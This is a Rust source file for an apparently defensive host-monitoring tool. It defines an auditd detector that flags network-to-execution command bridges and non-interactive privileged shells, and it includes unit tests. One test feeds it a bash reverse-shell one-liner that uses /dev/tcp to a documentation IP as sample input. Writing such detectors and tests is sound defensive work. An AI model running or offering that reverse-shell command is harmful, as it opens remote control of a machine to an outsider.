use crate::detectors::command_profile::assess_network_execution_command;
use crate::detectors::{evidence, string_field, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Evidence, Finding, RawEvent, Severity};

pub struct AuditDetector;

impl Detector for AuditDetector {
    fn name(&self) -> &'static str {
        "audit_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "AUDIT-001",
                "Audit log captured network command execution",
                Category::Process,
                Severity::High,
                "auditd captured a short-lived command that bridges network activity into command execution.",
            ),
            RuleMetadata::new(
                "AUDIT-002",
                "Audit log captured non-interactive privilege execution",
                Category::Privilege,
                Severity::Medium,
                "auditd captured sudo, su, or pkexec launching a non-interactive command shell.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        if !ctx.config.advanced_collectors.auditd_enabled {
            return Vec::new();
        }
        let mut findings = Vec::new();
        for event in events.iter().filter(|event| event.kind == "audit_exec") {
            if let Some(finding) = audit_network_execution(event, ctx) {
                findings.push(finding);
            }
            if let Some(finding) = audit_privilege_execution(event, ctx) {
                findings.push(finding);
            }
        }
        findings
    }
}

fn audit_network_execution(event: &RawEvent, ctx: &DetectContext) -> Option<Finding> {
    let argv = audit_command(event);
    let assessment = assess_network_execution_command(&argv);
    if !assessment.is_suspicious() {
        return None;
    }
    Some(
        Finding::new(
            &ctx.host_id,
            "Audit log captured network command execution",
            "A short-lived command captured by auditd appears to bridge network activity into command execution.",
            Severity::High,
            Category::Process,
            "AUDIT-001",
            audit_subject(event, &argv),
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("command_features", assessment.feature_names()),
            evidence("risk_reason", assessment.reason_text()),
            evidence("risk_score", assessment.score.to_string()),
        ]))
        .with_impact(vec![
            "Short-lived network execution commands may finish before procfs polling can observe them.".to_string(),
        ])
        .with_recommendations(vec![
            "Review surrounding audit records with the same msg/session id and inspect persistence locations.".to_string(),
            "If this was not an administrative action, preserve audit logs before cleanup.".to_string(),
        ]),
    )
}

fn audit_privilege_execution(event: &RawEvent, ctx: &DetectContext) -> Option<Finding> {
    let argv = audit_command(event);
    if !privilege_command_with_noninteractive_shell(&argv) {
        return None;
    }
    Some(
        Finding::new(
            &ctx.host_id,
            "Audit log captured non-interactive privilege execution",
            "sudo, su, or pkexec launched a non-interactive shell command from audit logs.",
            Severity::Medium,
            Category::Privilege,
            "AUDIT-002",
            audit_subject(event, &argv),
        )
        .with_evidence(audit_common_evidence(event, &argv, vec![
            evidence("privilege_tool", privilege_tool(&argv).unwrap_or("unknown")),
            evidence("risk_reason", "privilege utility launched a command shell"),
            evidence("risk_score", "65"),
        ]))
        .with_impact(vec![
            "Non-interactive privileged commands are common in automation but can also indicate post-login execution.".to_string(),
        ])
        .with_recommendations(vec![
            "Confirm the session, parent process, and operator identity around this audit record.".to_string(),
        ]),
    )
}

fn audit_common_evidence(event: &RawEvent, argv: &str, mut extra: Vec<Evidence>) -> Vec<Evidence> {
    let mut items = vec![
        evidence("argv", argv),
        evidence("exe_path", string_field(event, "exe")),
        evidence("process_name", string_field(event, "comm")),
    ];
    for key in [
        "pid",
        "ppid",
        "uid",
        "auid",
        "ses",
        "msg",
        "terminal",
        "ephemeral_event",
        "event_source_detail",
    ] {
        if let Some(value) = event.field(key).filter(|value| !value.trim().is_empty()) {
            items.push(evidence(key, value));
        }
    }
    items.append(&mut extra);
    items
}

fn audit_command(event: &RawEvent) -> String {
    event
        .field("argv")
        .filter(|value| !value.trim().is_empty())
        .map(str::to_string)
        .or_else(|| event.field("comm").map(str::to_string))
        .unwrap_or_default()
}

fn audit_subject<'a>(event: &'a RawEvent, argv: &'a str) -> &'a str {
    event
        .field("exe")
        .or_else(|| event.field("comm"))
        .filter(|value| !value.trim().is_empty())
        .unwrap_or(argv)
}

fn privilege_command_with_noninteractive_shell(argv: &str) -> bool {
    let tokens = argv.split_whitespace().collect::<Vec<_>>();
    let Some(tool) = privilege_tool_from_tokens(&tokens) else {
        return false;
    };
    let has_command_option = tokens.iter().any(|token| {
        matches!(
            token.to_ascii_lowercase().as_str(),
            "-c" | "--command" | "-lc" | "-ic"
        )
    });
    if tool == "su" && has_command_option {
        return true;
    }
    has_command_option && tokens.iter().any(|token| shell_token(token))
}

fn privilege_tool(argv: &str) -> Option<&'static str> {
    let tokens = argv.split_whitespace().collect::<Vec<_>>();
    privilege_tool_from_tokens(&tokens)
}

fn privilege_tool_from_tokens(tokens: &[&str]) -> Option<&'static str> {
    let first = token_basename(tokens.first().copied().unwrap_or(""));
    match first.as_str() {
        "sudo" => Some("sudo"),
        "su" => Some("su"),
        "pkexec" => Some("pkexec"),
        _ => None,
    }
}

fn shell_token(token: &str) -> bool {
    matches!(
        token_basename(token).as_str(),
        "sh" | "bash" | "dash" | "zsh" | "ksh" | "busybox"
    )
}

fn token_basename(token: &str) -> String {
    token
        .trim_matches('"')
        .trim_matches('\'')
        .rsplit('/')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase()
}

#[cfg(test)]
mod tests {
    use super::AuditDetector;
    use crate::detectors::{DetectContext, Detector};
    use sentinel_core::{RawEvent, SentinelConfig};
    use std::sync::Arc;

    #[test]
    fn detects_audit_network_execution_bridge() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "bash -c bash -i >& /dev/tcp/198.51.100.1/4444 0>&1")
            .with_field("exe", "/usr/bin/bash")
            .with_field("comm", "bash");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-001"));
    }

    #[test]
    fn detects_noninteractive_privilege_execution() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "sudo sh -c id")
            .with_field("exe", "/usr/bin/sudo")
            .with_field("comm", "sudo");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings
            .iter()
            .any(|finding| finding.rule_id == "AUDIT-002"));
    }

    #[test]
    fn ignores_plain_admin_command() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = RawEvent::new("auditd", "audit_exec")
            .with_field("argv", "sudo systemctl status nginx")
            .with_field("exe", "/usr/bin/sudo")
            .with_field("comm", "sudo");

        let findings = AuditDetector.detect(&[event], &ctx);

        assert!(findings.is_empty());
    }
}
